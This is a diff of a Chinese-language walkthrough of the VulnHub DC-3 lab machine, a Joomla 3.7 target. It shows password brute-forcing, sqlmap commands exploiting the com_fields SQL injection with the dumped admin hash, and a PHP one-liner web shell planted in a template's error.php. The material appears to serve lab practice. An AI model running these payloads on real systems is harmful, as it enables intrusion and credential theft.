@@ -2,6 +2,8 @@
 
 2025.02.22 https://www.vulnhub.com/entry/dc-32,312/
 
+[video]()
+
 ## Ip
 
 192.168.5.40
@@ -13,15 +15,27 @@ PORT   STATE SERVICE
 80/tcp open  http
 ```
 
-80 web 是 Joomla CMS，并且发现一个用户名 admin ，http://192.168.5.40/README.txt发现版本 3.7 有一个 sql 注入的利用，但是没有成功。
-
-目前只好尝试爆破密码，常使用一个小字典先进行爆破：
+80 web 是 Joomla CMS，并且发现一个用户名 admin ，http://192.168.5.40/README.txt发现版本 3.7 , 先尝试爆破密码，常使用一个小字典先进行爆破：
 
 ```
 python3 ~/tools/blast/blast_joomla.py -u http://192.168.5.40 -w ~/tools/dict/passwd_1050.txt  -usr admin
 ```
 
 得到用户登陆凭据: admin:snoopy 登陆系统 http://192.168.5.40/administrator/ 。
+
+同时该版本也有一个 sql 注入可以利用,sqlmap 同样可以跑出用户的 admin 用户的哈希，然后使用 john 破解也可以得到密码：
+
+```
+sqlmap -u "http://192.168.5.40/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --batch --risk=3 --level=5 --random-agent -D "joomladb" --tables -p list[fullordering]
+
+sqlmap -u "http://192.168.5.40/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --batch --risk=3 --level=5 --random-agent -D "joomladb" -T "#__users" -C name,password --dump
+
++--------+--------------------------------------------------------------+
+| name   | password                                                     |
++--------+--------------------------------------------------------------+
+| admin  | $2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu |
++--------+--------------------------------------------------------------+
+```
 
 在顶部菜单中，Extensions -> Templates -> Templates 选中一个主题 Beez3 ，编辑它的 error.php 页面，在最上面加入 php 一句话木马：`system($_GET['cmd']);`，然后点击保存。
 
